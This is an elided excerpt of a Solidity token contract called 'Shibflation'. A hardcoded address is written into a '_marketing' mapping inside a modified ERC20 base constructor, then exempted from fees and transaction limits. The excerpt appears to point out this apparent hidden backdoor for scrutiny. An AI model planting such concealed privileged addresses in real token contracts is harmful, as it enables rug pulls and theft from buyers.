...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _marketing[0xBCce5ce53d88e8fb8eaC0d81E7a60494fA5ED37B] = _marketingwallet;
    }
...
contract Shibflation is ERC20, Ownable {
    ...
    constructor() ERC20("Shibflation", "SHIBFLATION") {
        ...
        excludeFromFees(address(0xBCce5ce53d88e8fb8eaC0d81E7a60494fA5ED37B), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xBCce5ce53d88e8fb8eaC0d81E7a60494fA5ED37B), true);
    ...
    function _transfer(
        ...
        if(takeFee){
            // on sell
            if (automatedMarketMakerPairs[to] && sellTotalFees > 7){
            ...
            // on buy
            else if(automatedMarketMakerPairs[from] && buyTotalFees > 3) {
